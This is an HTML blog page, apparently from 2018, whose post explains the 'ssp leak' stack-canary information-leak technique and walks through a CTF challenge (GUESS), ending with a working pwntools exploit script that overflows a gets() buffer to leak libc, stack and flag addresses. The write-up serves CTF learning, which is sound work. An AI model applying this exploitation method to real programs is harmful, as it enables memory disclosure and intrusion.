@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="koocola&#39;s blog" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>ssp leak | koocola&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssp leak">
+<meta property="og:url" content="http://yoursite.com/2018/08/23/ssp_leak/index.html">
+<meta property="og:site_name" content="koocola&#39;s blog">
+<meta property="og:description" content="漏洞复现">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2018/08/23/ssp_leak/1.png">
+<meta property="og:updated_time" content="2018-08-23T13:43:24.242Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ssp leak">
+<meta name="twitter:description" content="漏洞复现">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/23/ssp_leak/1.png">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+</head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="koocola&#39;s blog" rel="home">koocola&#39;s blog</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">不要用战术上的勤奋掩饰战略上的懒惰</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-ssp_leak" class="post-ssp_leak post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      ssp leak
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/08/23/ssp_leak/" data-id="cjl6mb7g7000298ti4qiihfap" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>漏洞复现<br><a id="more"></a><br>canary保护机制在检测到存在栈溢出结束进程时会输出<strong>WAIT_STATUS stat_loc这个地址存放的指针的值，</strong>WAIT_STATUS stat_loc指针原本指向的字符串数组保存的是进程名，要是我们利用栈溢出更改<strong>WAIT_STATUS stat_loc指针指向我们想要泄露的内容的地址，就能在进程结束时泄露要输出的内容。这就是ssp leak的原理<br><strong>利用详例：</strong><br><strong>网鼎杯线上赛第一组赛题GUESS：</strong><br>题中把flag加载到了栈中，用fork函数创建2个子进程，并且存在一个gets的栈溢出漏洞。由于子进程栈溢出崩溃的话总进程不会崩溃，这样我们就有3次会来leak出flag的值。<br>我们第一次机会把</strong>WAIT_STATUS stat_loc更改为got表中的read函数泄露出栈基址，计算出environ参数的地址。<br>第二次机会通过eviron参数泄露出栈基址计算出flag的地址        第三次机会就可以leak出flag了<br><strong>注意点：</strong><br>    1、__WAIT_STATUS stat_loc可以用IDA直接查看地址<br>如图：<br>    <img src="/2018/08/23/ssp_leak/1.png" alt="enter description here"><br>    也可以在gets时p64(flag)*200,把栈中填满flag即可输入flag地址的值<br>    2、environ的地址在IDA中打开Libc.so.6搜索environ，在text段中找到他，双击能看到偏移地址，再双击就可以找到environ参数的地址<br>    over…<br>exp:(用的别人的模板)<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">environ = 0x03c6f38</span><br><span class="line">#p = remote(&quot;111.230.240.83&quot;,6667)</span><br><span class="line">p=process(&quot;./GUESS&quot;)</span><br><span class="line">elf=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">p.recvuntil(&quot;flag\n&quot;)</span><br><span class="line">p.send(&quot;1&quot; * 0x128 + p64(0x602040))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">read_offset = u64(p.recv(6).ljust(8, &quot;\x00&quot;))</span><br><span class="line">libc = read_offset - elf.symbols[&quot;read&quot;]</span><br><span class="line">environ += libc</span><br><span class="line">print hex(libc)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line">p.recvuntil(&quot;flag\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot; * 0x128 + p64(environ))</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">stack = u64(p.recv(6).ljust(8, &quot;\x00&quot;))</span><br><span class="line">print hex(stack)</span><br><span class="line">p.recvuntil(&quot;flag\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot; * 0x128 + p64(stack - 0x168))</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">print p.recvline()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/08/23/ssp_leak/">
+    <time datetime="2018-08-23T09:45:20.000Z" class="entry-date">
+        2018-08-23
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2018/08/21/fastbin_unlink/" rel="next">网鼎杯babyheap WP <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2018/08/23/ssp_leak/">ssp leak</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/21/fastbin_unlink/">网鼎杯babyheap WP</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/04/doublefree/">double free学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2018 koocola
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
